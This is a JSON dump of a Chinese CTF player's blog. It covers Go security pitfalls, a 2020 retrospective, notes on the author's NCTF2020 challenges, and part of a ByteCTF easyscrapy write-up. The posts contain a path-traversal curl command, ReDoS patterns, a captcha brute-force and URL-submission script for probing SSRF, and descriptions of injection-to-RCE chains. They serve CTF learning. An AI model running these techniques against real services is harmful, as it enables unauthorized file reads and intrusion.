{"meta":{"title":"byc_404's blog","subtitle":"","description":"","author":"byc_404","url":"https://www.bycsec.top","root":"/"},"pages":[{"title":"404 Not Found","date":"2021-02-17T15:07:44.271Z","updated":"2020-05-05T07:48:12.000Z","comments":true,"path":"404.html","permalink":"https://www.bycsec.top/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"关于自己","date":"2020-12-16T06:22:56.150Z","updated":"2020-12-16T06:22:56.150Z","comments":true,"path":"about/index.html","permalink":"https://www.bycsec.top/about/index.html","excerpt":"","text":"ctf web dog byc_404@X1cT34m 向往渗透测试/安全研究，也很喜欢代码审计 Node.js &gt;&gt; php 绝不恰烂钱，梦想能做喜欢方向的安全研究,能多会些开发就好了 目前暂时退役，有缘再见啦"},{"title":"所有分类","date":"2021-02-17T15:06:50.387Z","updated":"2021-02-17T15:06:50.387Z","comments":true,"path":"categories/index.html","permalink":"https://www.bycsec.top/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-02-17T15:06:25.032Z","updated":"2020-05-05T07:38:08.000Z","comments":true,"path":"mylist/index.html","permalink":"https://www.bycsec.top/mylist/index.html","excerpt":"","text":""},{"title":"友链","date":"2021-02-17T15:40:15.152Z","updated":"2021-02-17T15:40:15.152Z","comments":true,"path":"friends/index.html","permalink":"https://www.bycsec.top/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-11-05T09:04:26.385Z","updated":"2020-05-05T13:14:46.000Z","comments":true,"path":"tags/index.html","permalink":"https://www.bycsec.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"golang的一些安全问题","slug":"golang的一些安全问题","date":"2021-02-07T13:56:47.000Z","updated":"2021-02-18T05:09:03.594Z","comments":true,"path":"2021/02/07/golang的一些安全问题/","link":"","permalink":"https://www.bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","excerpt":"寒假主要是先出完了之前心心念念的typescript 题目，之后主要是抽点时间学golang.同学推荐的仓库讲的还是很不错的 https://github.com/unknwon/the-way-to-go_ZH_CN 从简单的开发与学习过程中可以感觉到golang的确非常安全，很多问题由于作为强类型的静态语言，从编译过程就能防止不安全的操作。因此大部分漏洞产生还是归结于依赖库（通常已经发展为CVE或者issue）以及开发者自身的操作漏洞。这里就作为小结,简单谈一谈","text":"寒假主要是先出完了之前心心念念的typescript 题目，之后主要是抽点时间学golang.同学推荐的仓库讲的还是很不错的 https://github.com/unknwon/the-way-to-go_ZH_CN 从简单的开发与学习过程中可以感觉到golang的确非常安全，很多问题由于作为强类型的静态语言，从编译过程就能防止不安全的操作。因此大部分漏洞产生还是归结于依赖库（通常已经发展为CVE或者issue）以及开发者自身的操作漏洞。这里就作为小结,简单谈一谈 interger overflow/truncationgolang 存在非常经典的整数反转/溢出问题 对无符号数的反转 123456789func main() &#123; var a uint32 = 2147483648 var b uint32 = 2147483648 var sum = a + b fmt.Println(reflect.TypeOf(sum)) fmt.Printf(\"Sum is : %d\",sum)&#125;//uint32//Sum is : 0 想要直接声明一个大小已经溢出的数自然不会通过编译，因此出现反转的话，主要是在变量的相加这样的计算才会会导致标志CF位反转 有符号数的溢出 1234567var a int8 = 127var b int8 = 1var sum int8 = a + bfmt.Println(reflect.TypeOf(sum))fmt.Printf(\"Sum is : %d\",sum)//int8//-128 具体的值可以看到math包中的常量定义。 在类型转换中,也会出现较大整型向较小整型转换的截断问题 12345var a int16 = 256var b = int8(a)fmt.Println(b)// 0 // high-order byte is truncated 我们可以看到整型安全的检查也出现在了gosec中，一个比较经典的例子就是：kubectl命令行中出现了一个strconv.Atoi导致的截断问题。当我们传入port参数的对应字符串后,容器启动的端口这一参数会将经Atoi处理后的字符串进行int32的类型转换。由于64位系统的int是int64类型。转int32的话会出现明显截断可以简化成以下代码： 1234v , _ := strconv.Atoi(\"4294967377\")s := int32(v)fmt.Println(s)// 81 这样就有可能导致81端口的服务启动，或者被停止。所以使用ParseInt ,ParseUInt会比较好。或者对端口号进行限制。 CTF中出现整数溢出的scenario 一般都是 xx shop之类的。通过重复的加数进行溢出然后鉴权。 pseudo-randgolang 的math/rand 包中，我们可以看到随机数生成的函数形式 跟进一下函数与结构体 123456789var globalRand = New(&amp;lockedSource&#123;src: NewSource(1).(*rngSource)&#125;)......func NewSource(seed int64) Source &#123; var rng rngSource rng.Seed(seed) return &amp;rng&#125; 可以看到,这些随机数函数的seed默认为1.也就是说如果不使用rand.Seed()确认种子的话，生成的只是所谓的伪随机数。 这种问题可能会出现在开发者直接用rand生成的字符串作为密钥的场景，比如gin的cookie的key.从而导致本地复现，直接鉴权。 go net/httpnet/http &lt; 1.11 CRLF低版本的http库会导致CRLF.比如http.NewRequest()。貌似是原本没有问题，但是在一次升级中疏忽了导致重新出现 现在会看到存在限制，我们无法传入\\r\\n的字符 WMCTF中的gogogo出现过这一漏洞，利用自然是通过CRLF发送POST请求进行绕过与上传。 weird stuff在之前的justCTF中，出现了一道go题。题目原本的漏洞是由出题人发现的一个issuehttps://github.com/golang/go/issues/40940 加上其对fileServer一些代码的魔改组合的。 简单陈述下的话，题目提供了一个go http起的FileServer 1http.Handle(\"/\", http.FileServer(http.Dir(\"/tmp\"))) flag就在其提供文件服务的文件夹下，但是，出题人加上了web服务的flag路由,从而使得我们没法通过直接访问/flag来获取文件。而是得到/flag路由的回显。 出题人的意图是利用其挖掘到的这个漏洞，造成错误的文件读取范围。通过访问其他文件越界读到flag.(http的Fileserver在我们访问时，会先根据我们访问的url进行一系列处理，杜绝路径穿越的url,之后进行文件读取返回给用户) 但是比较有意思的时，比赛中出现了一个非预期读flag的方式curl --path-as-is -X CONNECT http://gofs.web.jctf.pro/../flag 简单说就是用CONNECT请求+路径穿越的url读取到了文件。我们看看源码是怎么处理的如果是CONNECT方式请求，就不会处理url中的特殊字符。导致直接读取flag.其他的请求方法都会在cleanPath中被处理url 算是一个很有意思的问题。不过golang1.16似乎已经处理了。但是包括我在内的大部分应该还是使用的go1.15及以下版本，所以还是值得注意的 feature of slice之前在做buu上的roarCTF时遇到一道go题，其中一个利用点来自Confidence CTF,其中用到了golang slice的一个feature 123456789101112131415a := make([]uint64, 0)a = append(a, 1)a = append(a, 2)a = append(a, 3)b := append(a, 4)c := append(a, 5)fmt.Println(a)fmt.Println(b)fmt.Println(c)//result://[1 2 3]//[1 2 3 5]//[1 2 3 5] 按照直觉来说，b这里应该是[1,2,3,4],但实际上却是[1,2,3,5]这就与golang的slice也就是切片的结构相关了 12345type slice struct &#123; array unsafe.Pointer // ptr len int cap int&#125; slice结构中的cap是按2的倍数扩容的。所以说当我们append(3)时会发生第一次扩容，此时len为3，cap为2*2=4.执行b := append(a, 4)时，我们的4会被放在指针ptr的第四个位置。然后返回ptr len=4 cap=4给b。不过这并没有改变a的结构（slice只是指向内存的指针）之后进行c := append(a, 5)时，由于a没变，新元素只会覆盖之前b那放上的4. 那一道题目就是利用这点，可以通过先beg三次构造出len=3,cap=4的切片，通过题目中一个append超大随机数的机会，在下一次beg时达成元素覆盖。 这个可以算是slice的feature,还是很有意思的。 reDOS原本是以为golang不存在reDOS的问题的。当初阅读lmt-swallow的文章时也看到他提到golang有linear time matching。 不过后来发现还是有途径的。 当然，reDOS主要还是在js里影响比较大，因为其事件队列阻塞对于web服务的影响是巨大的。相比之下其他的DOS影响可能就较小。用nginx做个处理基本就没有影响。不过，如果是以Blind regex injection为目的考虑reDOS的话，就另当别论了。 回到golang上。golang使用的正则引擎是re2。但是用的是无回溯机制(DFA)。所以之前的payload如^(?=(PAYLOAD))((.*)*)*salt$就无效了 但是,通过其他方法制造延时仍然是可行的。比如re2对于{n}这样的正则，n存在有上限1000，且对于DFA状态数没有限制.我们可以通过不断重复(.?){1000}来制造足够的DFA状态进行一定程度上的延时 reDOS其实一直是一个很有意思的点,除了喜闻乐见的nodejs,前端中xss也可以导致这个问题，从而xsleak ,ruby中也有类似问题。当然，如果是从reDOS引申到正则盲注的话，sql注入中倒也有类似的情况。总之就是利用差异性进行数据提取。可惜因为太容易坏环境了，所以很难出道题到比赛中 :( SSTI最后一个就简单提一下ssti.要说golang这种静态编译还会出ssti还是挺难的( 除非源码中用sprintf 或者说拼接来构建template的参数 1var tmpl = fmt.Sprintf(`&lt;h2&gt;No search results for %s&lt;/h2&gt;`, xxx) golang的template跟很多模板引擎的语法差不多，比如双花括号指定可解析的对象。.xxx表示一个对象的xxx属性。.就是当前作用域的当前对象，基本就跟handlebars里的this差不多。 假如我们传入的参数是可解析的,就有可能泄露template在执行过程中引入的对象内容(执行的本质就是合并替换) 简单的demo可以参考这里 https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html 如果传入的struct属性含有指针的话(非常常见，因为用指针可以节省很很多空间),我们ssti的回显就只是一个地址。需要我们手动去访问属性才会解引 Summary &amp;&amp; Reference简单的梳理下自己见过的golang安全问题(CTF-based web go)。其实像之前dasCTF中也有golang的题目，用gob序列化存内容到cookie，不过利用点与go的关系为0，所以不谈。 自己golang的开发还有很多值得去学的，这门语言确实有其优越之处以及一些可能存在并被挖掘的安全问题 https://github.com/tsg-ut/tsgctf2020https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/https://github.com/golang/go/issues/30794https://github.com/golang/go/issues/40940https://github.com/mwarzynski/confidence2019_teaser_lottery","categories":[],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.bycsec.top/tags/Go/"}]},{"title":"Farewell to 2020","slug":"Farewell-to-2020","date":"2020-12-30T06:24:42.000Z","updated":"2021-02-18T05:09:00.622Z","comments":true,"path":"2020/12/30/Farewell-to-2020/","link":"","permalink":"https://www.bycsec.top/2020/12/30/Farewell-to-2020/","excerpt":"Time to say goodbye","text":"Time to say goodbye 2020马上就结束了。按往年的惯例，总要写篇文章回顾下自己一年的经历的。因此就继续矫情的记录下吧。 还记得1月份初时一堆期末考试扎堆，当时期末总共考了12门，人都考傻了。最后10号早上量子物理考完直接冲回寝室跟室友玩饥荒放松2333。然后第二天就开始做ylg群里发的code-breaking 题目还有一些ctf题。老实说，当时还啥都不会，基本自己做也一脸懵逼。不过反正以准备数模美赛为理由留在学校了（结果数模知识啥也没学XP），然后就可以花很长时间看wp,复现。说实话收获还挺大的。 当时定了个小目标，回武汉前每天都有产出，还是挺难得做到了。 1.16回武汉了，好像回去第一天就把电脑泼了水导致用不了了。。。然后跟老爸去修电脑顺便吃了回烧烤。后面的事就不用说了，疫情突然爆发，武汉还偏偏是核心地区，直接封城。我们也只能呆在家里做好自我防护。 实话说，那段时间的确有些人心惶惶。身边人反映出的医院乱象远比报道的惊人，再者，新冠威力确实惊人，每天看到那些数字的增加，心里真的不是滋味，但是也只能默默祈祷疫情赶快过去。 然而在家的最大好处就是可以尽情打ctf了。本来大二上课多到自己根本没时间去学习，去认真做几道题目。现在宅在家里的确很适合盯着电脑，学些感兴趣的知识或者复现几道题目了。恰好vidar-team师傅们举办了hgame，于是就又定了个小目标：尽量ak 掉每周的web.(结果到week3就ak不了orz.xss没做出来) 然后好像就去打了几天数模，水了篇美赛论文。当时自己基本就按托福作文的一些套路写的，最后写出来有些内容不忍直视。。。建模也是瞎建的。最后居然混了个H奖？？于是果断弃坑数模，太玄学了。 然后第一次打比较完整的ctf应该就是那个新春战役了。 icq新春战役应该是自己头一次感觉自己寒假的付出没白费。像我这种天赋比较差的，一开始学web只能纯靠刷题。最后能做出大部分题还是比较满意的 然后就是突如其来的入队题，一道原型链污染+rogue mysql 任意读。污染蛮简单的，rogue mysql 当时没接触过一脸懵逼，不过后来给了参考资料看就能做了。 3月份，xctf高校战役，自己终于第一次能跟x1c的伙伴们一起做题了。然而第一次打xctf这种规模的比赛时还有些不适应，好几道题都是只会做一部分，却不能完整的利用。唯一一个几乎能完整做完的web题最后一步利用不了。。。所以说当时有点小挫折吧。于是就去buu刷题了 接下来几个月可以说基本就是常规化操作：上网课，写作业，刷buu，水博客。然后规模相对大点的比赛就去打一打，ctftime上找些国际赛的有趣题。终于buu那边不知不觉刷到了web榜一，xctf也基本能做1，2个web.不过比较看重的比赛就直接无缘了。。。 6-8月这段时间就比复杂吧，因为实话说没什么产出。自己基本就每天找hackthebox上的靶机做。开始是只能按照wp,做些退役靶机。后来尝试了下现役的靶机，意外发现还能上手？于是从简单，到困难，到insane难度都有尝试。有时候会因为没有思路卡在一个地方很久很久，只能在htb论坛上找外国友人求指点。比较欣慰的是，大家都很乐意给我一些提示，并在自己做出来后道声祝贺。所以说有问题一定要大胆问呀，同时也非常感谢那些给过我帮助的人 不过这段时间也有些小郁闷，因为几次xctf web几乎都没人输出了。学弟们当时还没入队，每次各种比赛看web都只有一个或两个，没人帮助。那时候名次也都不行，感觉自己一个人根本没法carry。cybrics跟wmctf更是感觉小绿草都没人打了（后来才知道是wmctf是去支援su了）。总之push了一下就决定web这边提前考核了。 所以说，这段时间没什么人打x1c对我来说有些推进的作用的，我会更加逼迫自己去多学些内容，不然现有的实力根本不够。 真正有所改观的是8月份末了。最早开始是天翼杯,线上靠祥哥carry进final,然后final意外的打到了二等奖。让我觉得自己暑假htb做的还是挺有用的hhh.之后打了国赛，打了钓鱼城，打了强网杯。我的做题状态也从满状态到开始摸了（其实是因为qwb难度比较高）。 9月份返校，先是补之前的期末考。不得不说因为网课自己的效率确实下降了，考试不像以前那样得心应手。中间电工电子因为撞上国赛分区赛还缓考了。（不过最后还是95,还是挺满意的） 国赛分区赛就挺惊心动魄了。当时我们这边两个学弟去钓鱼城了，分区赛就双人打。pwn爷还因为考试只能打第一天上午。不过就算这样，第一天开场一个半小时自己就把当时web ak了（不过比不了rmb）。拿了1个弱智一血跟两个2血。进入抖腿看榜阶段。然而没有pwn真的伤……第二天更是因为只有我一个人单挑，心态贼差。当时一个不是很难的pgsql都没做出来。总之第二天比完后总感觉总决赛没戏了，感觉又要错过国字头比赛了……不过最后居然第7进了？感谢fmyy光速做pwn救了我们 然后就是国赛线下，在武汉比+国庆假期。我直接带上行李就能回家休假233。 不过我们欢迎妹子打电话首次”出征”体验极差。只去了三个人，fmyy打过一次线下，剩下两个都是第一次。第一天ad直接被暴打。我直到1点钟才能访问到别人靶机（那时候平台已经炸了，分都没了），在此之前都只能被动修题挨打,抓流量都没法复现出去。。。 所以说ylb sb不是没有道理的。我第一次体验就这么差真得一生黑 第二天改解题也惨惨，就做了个web的原型链污染游戏题。web3当时居然忘了逃逸了，可能人被ylb迷惑傻了吧。总之第一次国赛就草草结束了。幸好X1cteam他们拿了国一，不亏。晚上去抽奖更迷，%60+的中奖率我完美错过。看来天生没这个运气 再问候一遍ylb 第二次线下是巅峰极客。没记错的话去巅峰极客之前是bytectf的线上。然后就是ctf生涯永远的痛–easyscrapy，利用链摸清了结果因为赶飞机没能比赛中解出。。。好在不影响进线下。 比赛前一天在成都跟队友们恰火锅。中午吃的时候不觉得很辣，结果胃告诉我不是这么一回事 XP .当天晚上直接不敢碰辣锅了。还头一次见到成都的三鲜锅居然是辣/番茄/清汤。佩服佩服 第二天比赛发现huashuiteam在我对面，拍了下ylg 最后拿到奖杯蛮开心的，毕竟真的好久没产出了 晚上看了眼IFS上的熊猫~ 感觉成都这个城市还是挺不错的。不过前提是能承受的的差异。毕竟这里走几步就能看见一家双流兔头 巅峰极客比完回来决定换电脑了。之前的电脑太卡了，导致比赛时虚拟机+2个ide就卡成shi，思前想后换了huawei matebook14.主要是看重了性价比，然后自己偏爱轻薄本，加上不打游戏，性能绝对够用了。至于mac就等以后自己需要生产力时再掏钱买吧 XD 然后好像是XNUCA的线上来了，我又一次爆零。。。yysy oooooldjs这题挺对我胃口的。我当时调试了好久也是找到了原型链污染的地方却没法污染，始终没找到bypass的方法。结果赛后没想到污染还只是这题的第一步orz. 之后是西湖论剑的线下，欢迎妹子打电话再次出战 fmyy yyds.祥哥 yyds. 直接打到第7脱离低保。然后大腿在白泽夺冠，ylg+骑驴他们huashuiteam 第二。我们第7,x1c有低保。rrr在iot那也拿了钱。感觉新/老绿草抢了不少钱 2333 回头复现了下没做出来的web,感觉其实不难，但是调试还是挺重要的。 然后nctf2020 我出题。其实除开国赛以外自己基本就没怎么把出好的题卖给其他平台。因为我觉得高质量的题最好能放自己家的比赛，来分享知识。毕竟ctf的目的一个是have fun，另一个就是能从题目中收获一些对现实真实环境利用的方法。因为很长一段时间自己主要是研究nodejs,所以就把这些我自我认为能让人有所收获的知识点都放在校赛了。（学长们的奖励太丰厚了。。。）而且确实，从师傅们做我的题的过程中我也看到一些很有意思的点，包括一些非预期。 举个例子。package_manager两道题本意是原型链污染打子进程。不过有些师傅是靠日nunjucks做出来的。确实提醒了我不要盲目不跟源码就选框架。更意外的是我们njupt的开发dalao直接帮忙修复了这个问题233.虽然不是0day，但是的确解决掉了nunjucks模板注入的一种利用。 最后到了12月，xnuca线下 本来是打算过去渗透的。开始还担心工具是不是没准备好，结果现场看到赛制直接变成强网杯同款git based AWD + KOH了。而且awd还有一半（2/4）其实就是解题……只能说真的硬核，总共就一道解题web。其他的都是硬核pwn. ezwp思路错了就一脸懵逼。后面知道是phar反序列化后感觉还行？总之调了下收获挺大的。不过确实感觉得到调试wordpress这种框架源码比那些比较水的cms难太多了。所以后面肯定要研究下的。当然酒店的自助吃的真舒服。fmyy跟psb疯狂干饭，fmyy回来称体重直接胖了7斤233 然后回南京呆了一天就又去北京打字节了 单刷了三道ctf web。可惜其他方向都不会，直接gg。ad第二天靠fmyy的一血总算不是太难看。然后就没有然后了，又是被misc支配的日子orz 不过字节确实有钱。来之前的零食大礼包跟比完后的大礼包真的丰厚。。。而且报道那天晚上逛的时候，看到了计算所/物理所/空天信息研究所，以及一些互联网大厂。只能感慨帝都确实是帝都，大厂云集。也许以后也有过去发展的意愿 打完字节就决定该暂时退役了。结果一周后手痒还是打了huaweiCTF的第一场，web差一题ak.果然还是tcl.也可能是单刷web的话脑子顶不住吧，没想到cloud那题挂好代理是打fpm 所以后两场就不打了。毕竟还要复习来着. 之后手痒还是看了后两场，除了最后一场的ezlogin都做出来了，基本都是前几solve.看来现在解题的状态还不错？但是该退役还是得退役的 的确可以说，2020大部分时间都是在跟ctf打交道。我很高兴能够选择这条路并且参与其中。无论做题/出题/研究/调试某个漏洞的过程，都是充满趣味的。重要的是学到了知识，这样才不致于每天碌碌无为，浪费大学的大好时光。有时候虽然感觉心里不平衡，因为为竞赛付出的努力所带来的成果并不能与其他同学依靠导师所拿到的科研成果相提并论。但是这种不平衡只是暂时的，既然选择了这条路，就没有怀疑其正确性的必要了。坚持走下去就好 当然2020还是有些小遗憾的，比如某些比赛没能冲到前列，比如学业上有几门考试不太满意，比如还是继续单身生活（恐怕本科生涯脱不了单了）,比如没能坚持锻炼…… 希望明年能有所改进吧。 总的来说2020还是收获满满的。毕竟回首一看，自己作为一名ctfer的确是从一无所知到能有所输出了。人总归是要进步的，付出有回报才是我个人的信条。所以接下来的一年也要继续努力，完成自己最后的学术梦想吧 XP 之前看到非常崇拜的日本师傅写下的自省与抱负，让我觉得接下来也需要有规划的行动。 2020的反省： 人变得懒惰了，也许是疫情的影响，但是确实影响了效率 学golang，以及写一些java项目的flag没有拔掉 锻炼少了，少了跑操后光靠打篮球仍然会感受到身体机能的大幅下降 去图书馆少了，看书本学习的心态变得浮躁 上课摸鱼太多（水课除外） 2021的抱负： 开发：typescript项目的完成，golang的学习,java的进一步学习 算法：刷leetcode 锻炼：保证身体健康，争取定期长跑一次 科研: 争取能有所产出，至少不要做到毫无进展 尝试一些复杂的漏洞脚本编写，上线到github 保研到心仪的院校 如果成了，下半年冲各种CTF","categories":[],"tags":[]},{"title":"NCTF2020-出题小记","slug":"NCTF2020-出题小记","date":"2020-11-11T13:09:25.000Z","updated":"2021-02-18T05:09:40.104Z","comments":true,"path":"2020/11/11/NCTF2020-出题小记/","link":"","permalink":"https://www.bycsec.top/2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"nctf2020终于结束了。我手头的题目也基本无了 XD因为这次nctf学长他们要来的奖励挺丰厚的(xray license我也想要啊),所以就把手头的题都放出来了。如果难度对新生有些劝退的话还请多多包涵。校赛前几天，甚至以为yypl要来就临时赶出了一道bg_laravel,结果被忽悠了。最后大部分师傅可能都去做祥云杯了，所以没能过来打，算是比较可惜了。 这次我的题目除了bg_laravel以外全都有人解出.(rmb师傅还有其他师傅tql)题目环境放github上了,可以自取复现。https://github.com/baiyecha404/My-NCTF2020-Challs JS-world [11 solves]这道是专门为校赛准备的签到题目。整体思想上其实就是想展示下js在前后端的通用性。只要理解了前端源码就能推断后端逻辑。同时也想说明前端的waf等于没有waf :).加上powered by ejs的提示,应该不难看出用的是ejs来渲染html代码。那么直接用ejs的语句就可以RCE了. 比赛的时候本来一血很快就出了的，结果后来半天没人解。我看了眼html发现有的师傅已经可以RCE了结果就是不去看根目录的flag.txt.阿这…… Mango [3 solves]Mango 自然是为了玩一个mongo &lt;-&gt; mango的梗。这道题的起源比较有意思，来自于上半年某国际赛的赛题。当时题目考点是node-serialize的反序列化,不过我在黑盒测的时候意外发现那道题目还有nosql注入的漏洞存在。于是后来getshell后索性dump源码下来研究了下，也大致明白了为什么他的配置会产生nosql注入。加上后来发现这样的代码写法其实还挺常见的，所以干脆单独剥出来做成nosql注入了。 但是我的定位只是中等难度，最后只有3 solves我也很迷。不知道是因为大家没有接触过nosql注入还是什么的。我现在见过的大部分nodejs写的项目数据库都是用的mongodb,感觉出现nosql的概率还是不小的。稍微需要更换方式fuzz的地方就是json传递数据了。这个也算是比较常见的trick吧,node由于传递json导致与对象混淆的问题简直不要太多。所以第二个提示给出了app.use(express.json())。手抖加一个json中间件或者因为某个需求不得不加中间件(写api时),很有可能带来奇怪的问题。所以写node传参一定要记得类型检查啊。 PackageManager v1.0/v2.0 [7 solves / 3 solves]PackageManager 系列放了两道题。其实源码基本相差不大，2就是1的升级版。一开始的PackageManager 6月份就出好了。不过后来过了几个月后意外发现居然存在非预期。于是索性就把非预期放到第二版里并且加难了。考点其实是我觉得很值得去学习的用子进程来prototype pollution to RCE的一种手段.相比深挖模板污染属性的利用方法，子进程导致RCE算是大大降低了利用难度。然而国内相关文章貌似主要是先知上的一篇kibana cve分析,不过就子进程利用范围上有些差错。所以希望借此让大家重新关注下。 当然，后来意外发现这个考点第5空间线下貌似也出现过,不过我题目先出好的233。 v2除了达成RCE以外,为了增加一点难度，特意就把flag放到mongodb中了。这点根据hint.txt以及目录下的文件来推断应该不成问题。其实目的是模拟一个开发上线到生产环境的情景。比如像我这样,容易装了某个依赖写个demo，然后字段留到package.json里了,本地删了相关js代码后拿到生产环境下直接npm install ,就多装了没有用的依赖。所以这里就能用mongodb依赖连接内网mongodb拿flag. 然后比赛就翻车了……nunjucks把我给害了。之所以选nunjucks做模板引擎本来是因为我所知道的引擎除了nunjucks外，像hbs,ejs,pug,jade都是可以污染模板RCE的。所以没有跟源码就直接想看看有没有人非预期污染nunjucks属性的（p1g3师傅应该是找了nunjucks的污染，但是只能等我靶机每分钟重启才能看一次执行结果,没有预期解方便）。结果发现nunjucks直接模板注入根本不受这些影响…… 我v2本来目的就是说明其实不止fork,任意子进程都可以结合污染环境变量然后RCE,所以就用了execSync(&#39;whoami&#39;)。中间件里还考察了一个trick绕过debug路由的限制.结果模板注入直接通杀v1,v2 orz 不过貌似看v2的人不多，所以最后rmb跟p1g3师傅应该是预期做的。一血的Somnus师傅就直接非预期模板注入了……不过非预期什么的无所谓,能拿flag都是好方法,大家能学到子进程污染的知识我就比较满足了。最后比较普遍的问题是有的师傅连接mongodb代码写好后没有db.close().那这本地必然是拿不到查询结果的。 SimpleSimplePie [1 solves]挖链子是不可能的，所以只能自己手写几个乱七八糟的类来构造pop链了。整体思路我感觉跟tp系列的pop chain 差不多？就是个super-mini版的__toString() -&gt; __call() -&gt; call_user_func调用自身函数。 然后利用则比较有意思。灵感当然就是之前做htb时发现的新姿势 ssrf 打memcache触发反序列化. 后来意外发现这样的利用其实实战中还挺不少的，比如之前安恒俊杰师傅的ssrf -&gt; RCE的艰难利用就是ssrf 打redis触发thinkphp反序列化.我的题相比实战还是简单多了。 这里pop链里有个小坑就是链子的起点选__wakeup最好。我自己当初调试的时候就发现如果用__destruct做起点，会因为序列化数据的一些内容触发simplepie的报错。所以写利用类时故意刁难加了个__destruct希望踩个坑(我爬了)。但是唯一解出的rmb师傅在选择了__destruct做起点后是用了phpggc里的fast destruct 来进入__destruct。这倒确实出乎我意料,学到了。 bg_laravel [0 solves]没想到最后laravel成了防ak题……因为时临时赶的，所以很多地方写的不是很好，还请见谅。甚至由sql注入到上传getshell都是灵光一闪想出来的。 题目之所以用了保国当然是因为最近被马老师的鬼畜给洗脑了233。所以我的题目上传不给回显路径，其实是年轻人不讲武德不告诉你文件名 :) 首先在国内CTF laravel的反序列化早就被打烂了，所以我就想能不能出点新意。说起来之前七月火师傅的laravel文章下居然有人说没人这么写控制器所以反序列化没有用，这就来打脸。众所周知,phar反序列化直接扩宽了php反序列化的利用面。一个laravel站里出现的文件流操作绝对不少，那么如果能有可控点触发phar反序列化,结合pop链直接就能getshell. 但是这么考太简单了，所以自然是加点花。 刚好我最近接触到了laravel 5.8.10的很冷门的sql注入。冷门主要是因为github上修复都只是说修复了逃逸单引号的漏洞,而不是明说的sql注入漏洞。而且利用条件也有点苛刻，一个是要输入可控,另一个是回显得有json数据,否则json_extract()会报错。wp里给的参考文章也只是说了addSelect(),select() + json回显的数据可能会导致sql注入。可实际上，题目中出现的orderby()也是可以注入的。这就要看师傅们自己debug了。我自己是当初直接wrapJsonPath那下断点碰运气在可控位置一个个尝试触发才发现的。 sql注入怎么跟phar反序列化结合呢？除开可控的phar://输入点，我第一想法是把上传的文件名随机化，然后把文件名之类的保存在mysql里。但是很有意思的是，我在网上找了不少laravel的文件上传都用了ORM,也就是说,File类是个Eloquent model.执行$file-&gt;save()时对应的数据就都到了数据库里了,正合我意。 所以可能大部分师傅被这个冷门的laravel sql注入给难住了。所以还是要多谷歌+查看官方这个版本的一些小改动,说不定就能定位漏洞点了。 summary 总之这次比赛能看到师傅们做自己的题,顺便交流下思路还是比较开心的。希望大家明年能接着来玩，也可以期待下不知道有没有的X1CTF","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"ByteCTF2020-easyscrapy","slug":"ByteCTF2020-easyscrapy","date":"2020-10-26T00:39:02.000Z","updated":"2021-02-18T05:08:51.736Z","comments":true,"path":"2020/10/26/ByteCTF2020-easyscrapy/","link":"","permalink":"https://www.bycsec.top/2020/10/26/ByteCTF2020-easyscrapy/","excerpt":"这次ByteCTF的web题难度属实离谱。好几道题几乎都无法下手。自己第一天主要是看了easyscrapy以及配了beaker的环境(结果根本操作不起来，于是放弃了……)第二天上午在配scrapy的环境，一直到下午才出思路,基本上给我几小时就能出了。然而因为要赶飞机结果没时间做了……晚上到了后总归是把题目做出来了。只能说有点可惜，不然可以为小绿草拿个三/四血的。 这里我分享下自己一路下来的主要思路吧。希望能对他人有所帮助。另外写文章时环境已经关了，没啥图，将就着看吧","text":"这次ByteCTF的web题难度属实离谱。好几道题几乎都无法下手。自己第一天主要是看了easyscrapy以及配了beaker的环境(结果根本操作不起来，于是放弃了……)第二天上午在配scrapy的环境，一直到下午才出思路,基本上给我几小时就能出了。然而因为要赶飞机结果没时间做了……晚上到了后总归是把题目做出来了。只能说有点可惜，不然可以为小绿草拿个三/四血的。 这里我分享下自己一路下来的主要思路吧。希望能对他人有所帮助。另外写文章时环境已经关了，没啥图，将就着看吧 fuzz首先题目本身给出了一个功能可以让我们输入url以及一个验证码，但是注意到这里cookie是flask的session,存储的内容与每次页面回显的验证码一致。所以首先我们可以找到减少后面的工作的方法,就是带上固定的cookie写脚本进行存储url的操作。 12345678910111213141516171819202122232425262728293031323334353637import string, hashlibimport requestsimport reimport sysimport timeURL='http://39.102.69.151:30010/'cookies=&#123;'session':'eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc'&#125;def brute(code): a = string.digits + string.ascii_lowercase + string.ascii_uppercase for i in a: for j in a: for k in a: for m in a: for n in a: p = i + j + k + m + n s = hashlib.md5(p.encode('utf-8')).hexdigest()[0:6] if s == code: print(p) return pdef send(): r=requests.get(URL,cookies=cookies) varify=re.findall(r'&lt;span&gt;substr\\(md5\\(\\$str\\), 0, 6\\) === (.*)&lt;/span&gt;',r.text)[0] return varifydef push(url,code): r=requests.post(url=URL+'push',cookies=cookies,data=&#123;'url':url,'code':code&#125;) print(r.text)#code=brute(send())#print(code)push('http://120.27.246.202/',code)#push('http://127.0.0.1:','0AUDp') 爆破一次后就可继续用了。 之后发现，当输入完url存储后，urllist中会存在我们刚刚输入的url。之后点击则会前往/result?url=xxxx.似乎是一个ssrf的点。 第一天上午的话，感觉爬什么都爬不到。但是当时往自己的vps上打的时候倒是有意外的发现当时的笔记: 意外发现了scrapy_redis以及pycurl。正如上面所说，url数据似乎是被存到redis然后被爬虫给爬了。而后面/result?url则是动用了另一种功能进行pycurl的请求。 这里pycurl无疑是值得注意的,因为pycurl本质上似乎是跟调用curl一样的。那么可以使用gopher协议。 这样一来当然就想探测redis了。不过经过尝试,会发现没有任何回显。关于版本等等信息也是一无所知。 此时再次实验打自己，我发现当更换自己服务端的内容时，/result所显示的页面并没改变。 